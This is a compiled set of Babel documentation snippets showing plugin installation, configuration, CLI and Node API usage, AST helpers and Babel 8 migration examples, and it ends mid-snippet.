JavaScript Example Output\nDESCRIPTION: This JavaScript code snippet is the output of the TypeScript code snippet transformation by @babel/preset-typescript. The type annotation is removed during the transformation.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-typescript.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst x = 0;\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin - With Options\nDESCRIPTION: This JSON configuration demonstrates how to enable the @babel/plugin-transform-computed-properties plugin in a babel.config.json file with the 'loose' option set to true.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-computed-properties.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-computed-properties\",\n      {\n        \"loose\": true\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: This shell command shows how to use the `@babel/plugin-proposal-import-wasm-source` plugin via the Babel CLI.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-wasm-source.md#_snippet_6\n\nLANGUAGE: sh\nCODE:\n```\nbabel --plugins=@babel/plugin-proposal-import-wasm-source script.js\n```\n\n----------------------------------------\n\nTITLE: Plugin Usage via CLI\nDESCRIPTION: This command demonstrates how to use the plugin via the Babel CLI.  It transforms script.js using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-comments.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-flow-comments script.js\n```\n\n----------------------------------------\n\nTITLE: Promises Example JavaScript\nDESCRIPTION: This code demonstrates the use of Promises for asynchronous programming. It creates a function `timeout` that returns a Promise that resolves after a specified duration.  It chains multiple Promises together using `.then()` and handles errors using `.catch()`. It requires the Babel polyfill.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_31\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction timeout(duration = 0) {\n    return new Promise((resolve, reject) => {\n        setTimeout(resolve, duration);\n    })\n}\n\nvar p = timeout(1000).then(() => {\n    return timeout(2000);\n}).then(() => {\n    throw new Error(\"hmm\");\n}).catch(err => {\n    return Promise.all([timeout(100), timeout(200)]);\n})\n```\n\n----------------------------------------\n\nTITLE: Node API Usage\nDESCRIPTION: This JavaScript code shows how to use the Babel Node API to transform code with the plugin. It uses `transformSync` to apply the plugin to the provided code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-generator-functions.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-async-generator-functions\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Install Plugin via npm JavaScript\nDESCRIPTION: Command line instruction to install the babel plugin as a development dependency using npm.  This assumes npm is installed and configured on the system.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-logical-assignment-operators.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-logical-assignment-operators\n```\n\n----------------------------------------\n\nTITLE: TSTypeParameter Identifier Change (TypeScript)\nDESCRIPTION: This code snippet illustrates the change in how TSTypeParameter.name is represented in Babel 8's AST. Previously, it was a simple string, but now it's an Identifier node. This change is to reduce differences with @typescript-eslint and improve ESLint rule compatibility. The input is a TypeScript function with a type parameter.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_2\n\nLANGUAGE: typescript\nCODE:\n```\n// T is a TSTypeParameter\nfunction process<T>(input: T): T {}\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm\nDESCRIPTION: This shell command installs the `@babel/plugin-syntax-optional-catch-binding` package as a development dependency using npm. This package enables Babel to parse the optional catch binding syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-optional-catch-binding.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-optional-catch-binding\n```\n\n----------------------------------------\n\nTITLE: Configure plugin in babel.config.json\nDESCRIPTION: Configures the Babel plugin within a babel.config.json file.  This JSON snippet demonstrates how to add the @babel/plugin-transform-unicode-escapes plugin to the plugins array for Babel to utilize during the transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-escapes.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-unicode-escapes\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using double dash to resolve option ambiguities\nDESCRIPTION: Demonstrates how to use a double dash to separate babel-node options from script arguments when the script arguments might conflict with babel-node options.\nSOURCE: https://github.com/babel/website/blob/main/docs/node.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel-node --inspect --presets @babel/preset-env -- script.js --inspect\n```\n\n----------------------------------------\n\nTITLE: Class Transformation Example\nDESCRIPTION: Demonstrates how a simple class is transformed by Babel without using `@babel/plugin-transform-runtime`. It highlights the `_classCallCheck` function which will be repeated in every file that contains a class.\nSOURCE: https://github.com/babel/website/blob/main/docs/runtime.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nclass Circle {}\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel for Non-ASCII Character Handling\nDESCRIPTION: This snippet demonstrates how to configure Babel to restore the Babel 7 behavior by preventing the escaping of non-ASCII characters in string literals. This involves setting the `jsescOption` within `generatorOpts`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_20\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  generatorOpts: {\n    jsescOption: {\n      minimal: false\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via Node API (JavaScript)\nDESCRIPTION: This JavaScript code demonstrates how to use the @babel/plugin-transform-numeric-separator plugin through the Node API. It transforms the string \"code\" using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-numeric-separator.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-numeric-separator\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Skip For Of Iterator Closing JavaScript\nDESCRIPTION: This JavaScript code uses a `for...of` loop. When `skipForOfIteratorClosing` is enabled, Babel assumes that the iterator's `.return()` and `.throw()` methods are not defined or empty. This allows Babel to avoid calling these methods, which can improve performance, especially if the iterator is known to not require closing.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_22\n\nLANGUAGE: JavaScript\nCODE:\n```\nfor (const val of iterable) {\n  console.log(val);\n}\n```\n\n----------------------------------------\n\nTITLE: Using syntax-decorators via CLI\nDESCRIPTION: Executes Babel from the command line, using the @babel/plugin-syntax-decorators plugin to parse decorator syntax. It transforms the specified JavaScript file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-decorators.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-decorators script.js\n```\n\n----------------------------------------\n\nTITLE: Setting Charset for JavaScript Files in HTML\nDESCRIPTION: This snippet demonstrates how to explicitly set the charset to UTF-8 for JavaScript files within HTML. This ensures proper rendering of non-ASCII characters when the server does not enforce UTF-8 encoding.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_19\n\nLANGUAGE: html\nCODE:\n```\n<script charset=\"utf-8\" src=\"your-app.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Compiled Generator Function JavaScript\nDESCRIPTION: This JavaScript code shows the output after the `@babel/plugin-proposal-function-sent` plugin compiles the generator function. It demonstrates how `function.sent` is transformed into a temporary variable `_functionSent` assigned from the `yield` expression, which is then used within the generator function.  The `_skipFirstGeneratorNext` helper ensures correct initialization of the generator.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-sent.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet generator = _skipFirstGeneratorNext(function*() {\n  const _functionSent = yield;\n  console.log(\"Sent\", _functionSent);\n  console.log(\"Yield\", yield);\n});\n\nconst iterator = generator();\niterator.next(1); // Logs \"Sent 1\"\niterator.next(2); // Logs \"Yield 2\"\n```\n\n----------------------------------------\n\nTITLE: Add Default Import JavaScript\nDESCRIPTION: Adds a default import statement to the current module. Requires @babel/helper-module-imports.  The 'path' argument is the current path, and 'source' is the module.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-module-imports.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { addDefault } from \"@babel/helper-module-imports\";\naddDefault(path, 'source');\n```\n\n----------------------------------------\n\nTITLE: CLI Usage Shell\nDESCRIPTION: This shell command demonstrates how to use the Babel CLI to transform a JavaScript file (`script.js`) using the `@babel/plugin-transform-flow-strip-types` plugin. This directly specifies the plugin on the command line.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-strip-types.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-flow-strip-types script.js\n```\n\n----------------------------------------\n\nTITLE: Checking for FlowPredicate Nodes in JavaScript\nDESCRIPTION: This code snippet demonstrates how to check if a given AST node is a FlowPredicate node using the `t.isFlowPredicate(node)` method in Babel. It covers Flow predicates such as DeclaredPredicate and InferredPredicate. This method helps in identifying nodes that represent Flow type predicates.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_269\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isFlowPredicate(node);\n```\n\n----------------------------------------\n\nTITLE: Explicit Resource Management in Babel 7\nDESCRIPTION: Presents an example of explicit resource management in Babel 7 using the 'using' keyword. This manages resources ensuring proper disposal after use.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_29\n\nLANGUAGE: javascript\nCODE:\n```\nusing reader = getReader()\n```\n\n----------------------------------------\n\nTITLE: Specifying Preset Paths in babel.config.json\nDESCRIPTION: This JSON snippet shows how to define presets using relative paths in a Babel configuration file.  This is useful for referencing local presets within a project. The path should be relative to the location of the `babel.config.json` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/presets.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"./myProject/myPreset\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: This JavaScript code demonstrates how to use the Babel Node API to transform code using the @babel/plugin-transform-unicode-regex plugin. It uses `require('@babel/core').transformSync` to synchronously transform the input code string with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-regex.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-unicode-regex\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Using JSON Strings Syntax Plugin via Node API\nDESCRIPTION: Uses the Babel Node API to transform code with the @babel/plugin-syntax-json-strings plugin. The `transformSync` function is used to synchronously transform the code, enabling the parsing of JSON string syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-json-strings.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-json-strings\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: Configures the `@babel/plugin-syntax-function-sent` plugin in the `babel.config.json` file. This enables the plugin for all Babel transformations in the project. Requires `@babel/core` and `babel-loader` if using with webpack.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-function-sent.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-function-sent\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Use plugin-transform-modules-amd via Node API\nDESCRIPTION: This JavaScript code snippet shows how to use the plugin programmatically via the Babel Node API.  It transforms the input \"code\" using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-amd.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-modules-amd\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Creating ExportAllDeclaration in JavaScript\nDESCRIPTION: This snippet shows how to create an `ExportAllDeclaration` AST node using Babel's `t.exportAllDeclaration` method.  The `source` parameter is required and must be a `StringLiteral` representing the module from which to export all members.  This is equivalent to `export * from 'module'`. The `assertions`, `attributes`, and `exportKind` are optional and excluded from the builder function.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_61\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.exportAllDeclaration(source);\n```\n\n----------------------------------------\n\nTITLE: Transformed __proto__ Assignment Output\nDESCRIPTION: Shows the output code of the plugin transforming the __proto__ assignment into a function call. Demonstrates the input and output transformation of the code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-proto-to-assign.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction _defaults(obj, defaults) { ... }\n\n_defaults(bar, foo);\n```\n\n----------------------------------------\n\nTITLE: Minifying JavaScript with CLI\nDESCRIPTION: This command demonstrates how to use the babel-minify CLI to minify JavaScript code. It takes an input file (`input.js`), specifies an output file (`input.min.js`), and sets a mangle option to keep class names.\nSOURCE: https://github.com/babel/website/blob/main/docs/minify.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nminify input.js --out-file input.min.js --mangle.keepClassName\n```\n\n----------------------------------------\n\nTITLE: Configure Babel plugin in babel.config.json\nDESCRIPTION: This JSON configuration enables the @babel/plugin-syntax-optional-chaining plugin within the Babel build process.  It allows Babel to parse the optional chaining syntax during compilation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-optional-chaining.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-optional-chaining\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using the plugin via CLI\nDESCRIPTION: Runs Babel from the command line, specifying the safari-id-destructuring-collision-in-function-expression plugin. The plugin is applied to the script.js file during the transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-safari-id-destructuring-collision-in-function-expression.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-bugfix-safari-id-destructuring-collision-in-function-expression script.js\n```\n\n----------------------------------------\n\nTITLE: Object Rest Spread - JavaScript\nDESCRIPTION: This code snippet demonstrates the usage of object rest and spread properties in JavaScript. It shows how to extract properties from an object and how to create a new object using spread properties.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Rest Properties\nlet { x, y, ...z } = { x: 1, y: 2, a: 3, b: 4 };\nconsole.log(x); // 1\nconsole.log(y); // 2\nconsole.log(z); // { a: 3, b: 4 }\n\n// Spread Properties\nlet n = { x, y, ...z };\nconsole.log(n); // { x: 1, y: 2, a: 3, b: 4 }\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Example of using the `@babel/plugin-proposal-partial-application` plugin via the Babel Node API to transform code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-partial-application.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-proposal-partial-application\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Preset Ordering Example\nDESCRIPTION: This snippet shows the order in which presets are executed. Presets are executed from last to first. In this example @babel/preset-react will be executed before @babel/preset-env.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugins.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-env\", \"@babel/preset-react\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin\nDESCRIPTION: Shell command to install the `@babel/plugin-proposal-do-expressions` package as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-do-expressions.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-do-expressions\n```\n\n----------------------------------------\n\nTITLE: Configuration File Usage\nDESCRIPTION: This JSON configuration shows how to enable the plugin by adding it to the plugins array in your `babel.config.json` file. This is the recommended method for using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-generator-functions.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-async-generator-functions\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Specifying Options for @babel/register\nDESCRIPTION: This example demonstrates how to configure @babel/register with various options, including `ignore`, `only`, `extensions`, and `cache`. The `ignore` and `only` options use regular expressions and functions to control which files are compiled. The `extensions` option modifies the hooked extensions, and `cache` enables or disables caching.\nSOURCE: https://github.com/babel/website/blob/main/docs/register.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/register\")({\n  // Array of ignore conditions, either a regex or a function. (Optional)\n  // File paths that match any condition are not compiled.\n  ignore: [\n    // When a file path matches this regex then it is **not** compiled\n    /regex/,\n\n    // The file's path is also passed to any ignore functions. It will\n    // **not** be compiled if `true` is returned.\n    function(filepath) {\n      return filepath !== \"/path/to/es6-file.js\";\n    },\n  ],\n\n  // Array of accept conditions, either a regex or a function. (Optional)\n  // File paths that match all conditions are compiled.\n  only: [\n    // File paths that **don't** match this regex are not compiled\n    /my_es6_folder/,\n\n    // File paths that **do not** return true are not compiled\n    function(filepath) {\n      return filepath === \"/path/to/es6-file.js\";\n    },\n  ],\n\n  // Setting this will remove the currently hooked extensions of `.es6`, `.es`, `.jsx`, `.mjs`\n  // and .js so you'll have to add them back if you want them to be used again.\n  extensions: [\".es6\", \".es\", \".jsx\", \".js\", \".mjs\"],\n\n  // Setting this to false will disable the cache.\n  cache: true,\n});\n```\n\n----------------------------------------\n\nTITLE: Transformed Private Destructuring - JavaScript\nDESCRIPTION: This code snippet shows the result of applying the @babel/plugin-proposal-destructuring-private plugin to the previous example. The private field destructuring has been replaced with a direct access to the private field.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-destructuring-private.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  x;\n  #y;\n  equalsTo(_p) {\n    var { x } = _p, y = _p.#y;\n    return this.x === x && this.#y === y;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel for F# Pipeline Operator\nDESCRIPTION: This snippet shows how to configure Babel to use the `@babel/plugin-proposal-pipeline-operator` plugin with the `fsharp` proposal option. This enables support for the F# variant of the pipeline operator.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-03-7.5.0.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  plugins: [\n    [\"@babel/proposal-pipeline-operator\", { proposal: \"fsharp\" }]\n  ]\n};\n\n```\n\n----------------------------------------\n\nTITLE: Adding a Named Import Example JavaScript\nDESCRIPTION: Example showing how to add a named import within a Babel plugin. The code imports 'coroutine' from 'bluebird' if it hasn't already been imported and replaces the referenced identifier with the imported name.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-module-imports.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { addNamed } from \"@babel/helper-module-imports\";\n\nexport default function({ types: t }) {\n  return {\n    visitor: {\n      ReferencedIdentifier(path) {\n        let importName = this.importName;\n        if (importName) {\n          importName = t.cloneDeep(importName);\n        } else {\n          // require('bluebird').coroutine\n          importName = this.importName = addNamed(path, 'coroutine', 'bluebird');\n        }\n\n        path.replaceWith(importName);\n      }\n    },\n  };\n}\n```\n\n----------------------------------------\n\nTITLE: Plugin Order Configuration JSON\nDESCRIPTION: Specifies the order of plugins in a Babel configuration file. `@babel/plugin-transform-class-static-block` should be placed before `@babel/plugin-transform-class-properties` to ensure proper transformation when using both.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-static-block.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    \"@babel/plugin-transform-class-static-block\",\n    \"@babel/plugin-transform-class-properties\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Node API\nDESCRIPTION: Example of using the plugin through the Node API.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-modules.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-json-modules\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel for Current Node.js Version\nDESCRIPTION: This configuration targets the current Node.js version using the `node: \"current\"` target. Babel will use `process.versions.node` to determine the current Node.js version and transpile the code accordingly, ensuring compatibility with the runtime environment.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-12-07-the-state-of-babel.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"presets\": [\n    [\"env\", {\n      \"targets\": {\n        \"node\": \"current\"\n      }\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with Assumptions (JSON)\nDESCRIPTION: This JSON configuration shows how to specify assumptions for Babel during compilation. The `assumptions` object configures Babel to assume `noDocumentAll` and `noClassCalls` are true. This helps Babel optimize the output based on these assumptions.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"targets\": \">0.5%\",\n  \"assumptions\": {\n    \"noDocumentAll\": true,\n    \"noClassCalls\": true\n  },\n  \"presets\": [\"@babel/preset-env\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using TSTypeReference (TS)\nDESCRIPTION: Illustrates the AST for TSTypeReference in Babel 7 and Babel 8. The `typeParameters` property is renamed to `typeArguments`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_50\n\nLANGUAGE: typescript\nCODE:\n```\nvar arr: Array<string>;\n\n// AST in Babel 7\n{\n  type: \"TSTypeReference\",\n  typeName: Identifier(\"Array\"),\n  typeParameters: {\n    type: \"TSTypeParameterInstantiation\",\n    params: [{\n      type: \"TSStringKeyword\"\n    }]\n  }\n}\n\n// AST in Babel 8\n{\n  type: \"TSTypeReference\",\n  typeName: Identifier(\"Array\"),\n  typeArguments: {\n    type: \"TSTypeParameterInstantiation\",\n    params: [{\n      type: \"TSStringKeyword\"\n    }]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Compilation Task in JavaScript\nDESCRIPTION: This snippet defines a build task using the 'start' build system. It finds JavaScript files in the 'src/**/*.js' pattern, reads them, transforms them using Babel with a specified configuration, and writes the output to the 'build/' directory. The babelConfig object is used to configure Babel, disabling babelrc and enabling source maps.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/start/usage.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport sequence from '@start/plugin-sequence'\nimport find from '@start/plugin-find'\nimport read from '@start/plugin-read'\nimport babel from '@start/plugin-lib-babel'\nimport write from '@start/plugin-write'\n\nconst babelConfig = {\n  // …\n  babelrc: false,\n  sourceMap: true,\n}\n\nexport const task = () =>\n  sequence(\n    find('src/**/*.js'),\n    read,\n    babel(babelConfig),\n    write('build/')\n  )\n```\n\n----------------------------------------\n\nTITLE: Installing syntax-decorators via npm/yarn\nDESCRIPTION: Installs the @babel/plugin-syntax-decorators plugin as a development dependency using npm or yarn. This allows Babel to parse decorator syntax in your code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-decorators.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-decorators\n```\n\n----------------------------------------\n\nTITLE: Compile to File\nDESCRIPTION: Compiles `script.js` using Babel and outputs the result to `script-compiled.js`. This command uses the `--out-file` option to specify the output file path.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel script.js --out-file script-compiled.js\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration (with options)\nDESCRIPTION: Example of how to configure the plugin in a Babel configuration file with the `allowTopLevelThis` option enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-commonjs.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-transform-modules-commonjs\", {\n      \"allowTopLevelThis\": true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Output JavaScript Code Example\nDESCRIPTION: Shows the resulting JavaScript code after the babel-plugin-minify-replace plugin has been applied. In this example, the `__DEV__` identifier has been replaced with `0` in the first conditional statement, while the second instance (a.__DEV__) remains unchanged because it's a property access.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-replace.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nif (!0) {\n  foo();\n}\nif (a.__DEV__) {\n  foo();\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Config JSON\nDESCRIPTION: Shows how to enable the plugin in a babel.config.json file. The plugin is added to the plugins array, which instructs Babel to use it during the transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-constant-elements.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-react-constant-elements\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Fragments with Classic Runtime (JSX to JS)\nDESCRIPTION: Shows customizing the classic runtime's fragment handling with custom pragmas for both JSX and Fragments using Preact.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\n/** @jsx Preact.h */\n/** @jsxFrag Preact.Fragment */\n\nimport Preact from \"preact\";\n\nvar descriptions = items.map((item) => (\n  <>\n    <dt>{item.name}</dt>\n    <dd>{item.value}</dd>\n  </>\n));\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n/** @jsx Preact.h */\n/** @jsxFrag Preact.Fragment */\n\nimport Preact from \"preact\";\n\nvar descriptions = items.map((item) =>\n  Preact.h(\n    Preact.Fragment,\n    null,\n    Preact.h(\"dt\", null, item.name),\n    Preact.h(\"dd\", null, item.value)\n  )\n);\n```\n\n----------------------------------------\n\nTITLE: Use Babel CLI with plugin\nDESCRIPTION: Executes the Babel CLI to transform a JavaScript file (script.js) using the @babel/plugin-syntax-class-static-block plugin.  This allows parsing files containing class static blocks.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-class-static-block.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-class-static-block script.js\n```\n\n----------------------------------------\n\nTITLE: Add Named Import with Hint JavaScript\nDESCRIPTION: Adds a named import statement with a specific name hint. Requires @babel/helper-module-imports. The 'nameHint' option allows specifying the desired variable name for the import.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-module-imports.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { addNamed } from \"@babel/helper-module-imports\";\naddNamed(path, 'named', 'source', { nameHint: \"hintedName\" });\n```\n\n----------------------------------------\n\nTITLE: Checking for Declaration Nodes in JavaScript\nDESCRIPTION: This code snippet demonstrates how to check if a given AST node is a Declaration node using the `t.isDeclaration(node)` method in Babel. It covers various declaration types like ClassDeclaration, FunctionDeclaration, and VariableDeclaration. This method helps in identifying nodes that introduce bindings in the scope.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_260\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isDeclaration(node);\n```\n\n----------------------------------------\n\nTITLE: Install Babel CLI via npm\nDESCRIPTION: This snippet demonstrates how to install the Babel CLI as a development dependency using npm.  It utilizes the `npm install` command with the `--save-dev` flag, ensuring the Babel CLI is added to the `devDependencies` section of the `package.json` file. This command needs npm installed to be executed.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/webstorm/install.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/cli\n```\n\n----------------------------------------\n\nTITLE: Console Scope with babel-plugin-console/scope.macro\nDESCRIPTION: This example showcases the use of `babel-plugin-console/scope.macro` to add scoping information to console outputs. The `scope` function provides context about the function where the console message is logged, improving debugging capabilities. This macro enhances developer experience by providing more informative console logs without complex configurations.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-11-zero-config-with-babel-macros.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport scope from 'babel-plugin-console/scope.macro'\n\nfunction add100(a) {\n  const oneHundred = 100\n  scope('Add 100 to another number')\n  return add(a, oneHundred)\n}\n\nfunction add(a, b) {\n  return a + b;\n}\n```\n\n----------------------------------------\n\nTITLE: Using splitExportDeclaration in Babel Traversal JavaScript\nDESCRIPTION: This code snippet demonstrates how to use `splitExportDeclaration` within a Babel traversal. It imports `traverse` from `@babel/traverse` and `splitExportDeclaration` from `@babel/helper-split-export-declaration`. The code traverses the AST and, when it encounters an ExportDefaultDeclaration that declares a class, it calls `splitExportDeclaration` to transform the AST.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-split-export-declaration.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport traverse from \"@babel/traverse\";\nimport splitExportDeclaration from 